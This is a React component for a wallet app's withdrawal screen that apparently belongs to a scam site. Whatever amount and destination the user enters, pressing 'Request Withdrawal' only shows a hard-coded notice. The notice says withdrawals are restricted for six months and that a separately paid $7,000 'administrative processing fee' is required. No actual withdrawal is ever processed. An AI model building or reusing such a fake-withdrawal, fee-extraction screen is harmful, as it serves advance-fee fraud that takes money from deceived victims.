"use client";

import { useState } from "react";
import { X, ShieldAlert, ChevronDown } from "lucide-react";
import { WITHDRAW_METHODS, type PaymentMethod } from "@/lib/payment-methods";
import MethodMark from "@/components/ui/method-mark";
import { formatCurrency, currencyFlag } from "@/lib/format";

type Wallet = { currency: string; symbol: string; balance: number };

export default function WithdrawMethods({ wallets }: { wallets: Wallet[] }) {
  const [active, setActive] = useState<PaymentMethod | null>(null);
  const [amount, setAmount] = useState("100.00");
  const [currency, setCurrency] = useState(wallets[0]?.currency ?? "USD");
  const [destination, setDestination] = useState("");
  const [blocked, setBlocked] = useState(false);

  const wallet = wallets.find((w) => w.currency === currency) ?? null;

  function open(m: PaymentMethod) {
    setActive(m);
    setBlocked(false);
    setDestination("");
  }
  function close() {
    setActive(null);
    setBlocked(false);
  }

  return (
    <>
      {/* Method grid */}
      <div className="grid grid-cols-2 gap-4 sm:grid-cols-3 xl:grid-cols-4">
        {WITHDRAW_METHODS.map((m) => {
          return (
            <button
              key={m.key}
              onClick={() => open(m)}
              className="flex flex-col items-center gap-3 rounded-2xl border border-slate-200 bg-white p-5 text-center transition-colors hover:border-slate-300 hover:bg-slate-50"
            >
              <MethodMark method={m} />
              <span className="flex flex-col gap-0.5">
                <span className="text-[13px] font-bold text-slate-900">
                  {m.name}
                </span>
                <span className="text-[11px] text-slate-500">{m.blurb}</span>
              </span>
            </button>
          );
        })}
      </div>

      {/* Modal */}
      {active && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/40 p-4">
          <div className="flex w-full max-w-[420px] flex-col gap-5 rounded-2xl border border-slate-200 bg-white p-6 shadow-xl">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <MethodMark method={active} size="sm" />
                <div className="flex flex-col">
                  <h2 className="text-[15px] font-bold text-slate-900">
                    Withdraw via {active.name}
                  </h2>
                  <p className="text-[11px] text-slate-500">{active.blurb}</p>
                </div>
              </div>
              <button
                aria-label="Close"
                onClick={close}
                className="text-slate-400 hover:text-slate-900"
              >
                <X className="size-4" />
              </button>
            </div>

            {blocked ? (
              <div className="flex flex-col gap-3 rounded-xl border border-amber-200 bg-amber-50 p-4">
                <div className="flex items-center gap-2 text-amber-600">
                  <ShieldAlert className="size-5" />
                  <p className="text-sm font-bold">Withdrawals unavailable</p>
                </div>
                <p className="text-[13px] leading-relaxed text-slate-700">
                  We are pleased to inform you that your funds are now fully
                  available for use. However, please be advised that access to
                  your account via {active.name} temporarily restricted for a
                  period of six [6] months.
                  <br />
                  During this period, all transactions must be conducted using
                  your issued debit card.
                  <br /> Kindly note that an administrative processing fee of
                  $7,000.00 is required. This fee must be paid separately and
                  will not be deducted from your available account balance.<br/>
                  Should you require any further clarification, please contact
                  our customer support team.
                </p>
                <button
                  onClick={close}
                  className="mt-1 rounded-lg bg-slate-900 py-2.5 text-[13px] font-semibold text-white transition-colors hover:bg-slate-800"
                >
                  Got it
                </button>
              </div>
            ) : (
              <>
                <div className="flex flex-col gap-2">
                  <label className="text-[11px] font-bold tracking-[0.5px] text-slate-500">
                    AMOUNT
                  </label>
                  <div className="flex items-center justify-between rounded-lg border border-slate-200 bg-slate-50 p-3">
                    <div className="flex items-baseline gap-1">
                      <span className="font-mono text-xl font-bold text-slate-900">
                        {wallet?.symbol ?? "$"}
                      </span>
                      <input
                        type="number"
                        min="0"
                        step="0.01"
                        value={amount}
                        onChange={(e) => setAmount(e.target.value)}
                        className="w-[140px] bg-transparent font-mono text-xl font-bold text-slate-900 focus:outline-none"
                      />
                    </div>
                    <div className="relative flex items-center gap-1.5 rounded-md border border-slate-200 bg-white px-2.5 py-1.5">
                      <span className="text-[13px] font-bold text-slate-900">
                        {currencyFlag(currency)} {currency}
                      </span>
                      <ChevronDown className="size-2.5 text-slate-900" />
                      <select
                        value={currency}
                        onChange={(e) => setCurrency(e.target.value)}
                        className="absolute inset-0 cursor-pointer opacity-0"
                        aria-label="Currency"
                      >
                        {wallets.map((w) => (
                          <option key={w.currency} value={w.currency}>
                            {w.currency}
                          </option>
                        ))}
                      </select>
                    </div>
                  </div>
                  <p className="text-[11px] text-slate-500">
                    Available: {formatCurrency(wallet?.balance ?? 0, currency)}{" "}
                    {currency}
                  </p>
                </div>

                <div className="flex flex-col gap-2">
                  <label className="text-[11px] font-bold tracking-[0.5px] text-slate-500">
                    DESTINATION
                  </label>
                  <input
                    type="text"
                    value={destination}
                    onChange={(e) => setDestination(e.target.value)}
                    placeholder={`${active.name} account / email / IBAN`}
                    className="rounded-lg border border-slate-200 bg-slate-50 px-3 py-2.5 text-[13px] text-slate-900 placeholder:text-slate-400 focus:border-slate-400 focus:outline-none"
                  />
                </div>

                <button
                  onClick={() => setBlocked(true)}
                  className="rounded-lg bg-emerald-500 py-3 text-[13px] font-bold text-white transition-colors hover:bg-emerald-600"
                >
                  Request Withdrawal
                </button>
              </>
            )}
          </div>
        </div>
      )}
    </>
  );
}
